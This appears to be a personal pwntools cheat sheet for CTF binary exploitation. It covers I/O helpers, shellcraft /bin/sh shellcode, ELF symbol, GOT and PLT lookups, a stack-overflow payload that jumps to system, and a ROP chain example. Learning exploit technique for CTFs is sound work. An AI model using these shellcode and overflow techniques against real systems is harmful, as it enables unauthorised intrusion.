[TOC]

# pwntool
	from pwn import *
	asm("XXX")
	sh=process("./$name")
	sh=remote(IP,port)
	sh.close()
	sh.send($string)
	sh.sendline($string)
	sh.recv(numb=$num,timeout=$num)
	sh.recvline()
	sh.recvuntil($string,drop=false)
	sh.recvall()
	sh.recvrepeat()
	sh.interaactive() 
	
	>>> context.arch      = 'i386'
	>>> context.os        = 'linux'
	>>> context.endian    = 'little'
	>>> context.word_size = 32
	
	
	>>> print disasm('6a0258cd80ebf9'.decode('hex'))
	   0:   6a 02                   push   0x2
	   2:   58                      pop    eax
	   3:   cd 80                   int    0x80
	   5:   eb f9                   jmp    0x0
	
	>>> print shellcraft.i386.nop().strip('\n')
	    nop
	>>> print shellcraft.i386.linux.sh()
	    /* push '/bin///sh\x00' */
	    push 0x68
	    push 0x732f2f2f
	    push 0x6e69622f
	
	
	from pwn import *
	context(os='linux',arch='amd64')
	shellcode = asm(shellcraft.sh())
	or
	from pwn import *
	shellcode = asm(shellcraft.amd64.linux.sh())
	
	
	>>> e = ELF('/bin/cat')
	>>> print hex(e.address)  # 文件装载的基地址
	0x400000
	>>> print hex(e.symbols['write']) # 函数地址
	0x401680
	>>> print hex(e.got['write']) # GOT表的地址
	0x60b070
	>>> print hex(e.plt['write']) # PLT的地址
	0x401680
	>>> print hex(e.search('/bin/sh').next())# 字符串/bin/sh的地址
	
	
	from pwn import *
	elf = ELF('./level0')
	sys_addr = elf.symbols['system']
	payload = 'a' * (0x80 + 0x8) + p64(sys_addr)
	
	
	elf = ELF('ropasaurusrex')
	rop = ROP(elf)
	rop.read(0, elf.bss(0x80))
	rop.dump()
	# ['0x0000:        0x80482fc (read)',
	#  '0x0004:       0xdeadbeef',
	#  '0x0008:              0x0',
	#  '0x000c:        0x80496a8']
	str(rop)
	# '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'
	
